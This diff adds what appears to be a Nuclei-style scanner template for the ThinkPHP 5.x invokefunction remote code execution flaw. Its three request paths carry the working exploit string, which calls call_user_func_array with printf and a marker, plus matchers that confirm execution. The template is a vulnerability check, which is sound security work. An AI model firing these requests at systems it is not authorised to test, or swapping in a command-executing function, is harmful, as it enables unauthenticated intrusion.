@@ -1,0 +1,28 @@
+id: thinkphp-5x-invokefunction-rce
+
+info:
+  name: ThinkPHP 5.x - invokefunction RCE (echo probe)
+  author: pentest-platform
+  severity: critical
+  description: |
+    ThinkPHP 5.x allows user-controlled method resolution via
+    ?s=/index/\think\app/invokefunction, leading to unauthenticated RCE.
+    This template uses a non-destructive printf echo to confirm execution
+    without writing files or running shell commands.
+  tags: safe-poc, thinkphp, rce, cve
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=pentest999999"
+      - "{{BaseURL}}/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=pentest999999"
+      - "{{BaseURL}}/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=pentest999999"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pentest999999"
+      - type: status
+        status:
+          - 200
